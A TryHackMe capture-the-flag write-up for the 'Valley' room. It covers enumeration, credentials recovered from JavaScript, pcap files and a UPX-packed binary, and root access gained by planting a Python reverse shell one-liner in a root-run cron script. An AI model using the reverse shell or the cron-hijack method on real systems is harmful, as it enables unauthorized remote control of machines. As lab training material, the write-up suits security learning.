# TryHackMe Writeup — [Valley](https://tryhackme.com/room/valleype)
## Description
In this room, we performed a full compromise of the target machine by leveraging exposed development files, credential reuse, FTP misconfigurations, and privilege escalation via an insecure scheduled Python script. The engagement involved directory enumeration, analysis of pcap network captures, binary analysis, and a reverse shell to escalate to root.

## Scanning & Enumeration
We start with an Nmap scan to discover open ports and services:
```python
nmap -sC -sV -p- -A 10.10.187.116
```
Open ports:
```python
22/tcp   open  ssh
80/tcp   open  http
37370/tcp open ftp
```
## Exploring HTTP (Port 80)
Browsing the website didn’t reveal much at first. We launched directory brute forcing:
```python
gobuster dir -u http://10.10.187.116 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
We discovered the directory ```/static```, and after further enumeration:
```python
gobuster dir -u http://10.10.187.116/static -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```
Interesting discovery: ```/static/00```

Inside, we found dev notes:
```python
dev notes from valleyDev:
- add wedding photo examples
- redo the editing on #4
- remove /dev1243224123123
- check for SIEM alerts
```
Navigating to ```/dev1243224123123``` revealed a login form.

Finding Credentials

Checking the page source (```Ctrl + U```), we found a file called ```dev.js```.

Reviewing its content, we found hardcoded credentials in the script:
```python
if (username === "*****" && password === "*******") {
    window.location.href = "/dev1243224123123/***********";
}
```
Logging in provided more dev notes, including:
```python
dev notes for ftp server:
- stop reusing credentials
- check for any vulnerabilities
- stay up to date on patching
- change ftp port to normal port
```
## Accessing FTP
We attempted login using the credentials found in ```dev.js```:
```python
ftp <username>@10.10.187.116 -p 37370
```
Files found on FTP:

* ```siemFTP.pcapng```

* ```siemHTTP1.pcapng```

* ```siemHTTP2.pcapng```

Analyzing PCAP Files

Using Wireshark, we analyzed the pcap files:

* ```siemFTP.pcapng```: revealed old FTP anonymous login — no longer valid.

* ```siemHTTP1.pcapng```: nothing useful.

* ```siemHTTP2.pcapng```: Found HTTP POST with login credentials for SSH:

```python
Form item: "uname" = "valleyDev"
Form item: "psw" = "*******"
```

## Gaining User Access
Using the SSH credentials:

```python
ssh valleyDev@10.10.187.116
```
Obtained ```user.txt```

## Privilege Escalation
Checking for cron jobs:
```python
cat /etc/crontab
```
Found:
```python
root python3 /photos/script/photosEncrypt.py
```
The script is executed with root privileges, but we cannot modify it as the current user. However, in ```/home```, we discovered a file named ```valleyAuthenticator```.

We downloaded it to our machine:
```python
python3 -m http.server
wget http://10.10.187.116:8000/valleyAuthenticator
```
## Analyzing the Binary
We ran:
```python
strings valleyAuthenticator
```
We noticed the binary was packed with UPX. To unpack:
```python
upx -d valleyAuthenticator
```
Running ```strings``` again revealed credentials for user ```valley```.

We switched users:
```python
su valley
```
Now we could edit the vulnerable script:
```python
nano /photos/script/photosEncrypt.py
```
Inserted a Python reverse shell:
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
Start listener on our machine:
```python
nc -lvnp 4444
```
After waiting for the cron job — root shell obtained.

## Conclusion

This room demonstrated the dangers of exposed development files, credential reuse, and insecure cron jobs. By combining enumeration, pcap analysis, and privilege escalation, we achieved full system compromise and root access.



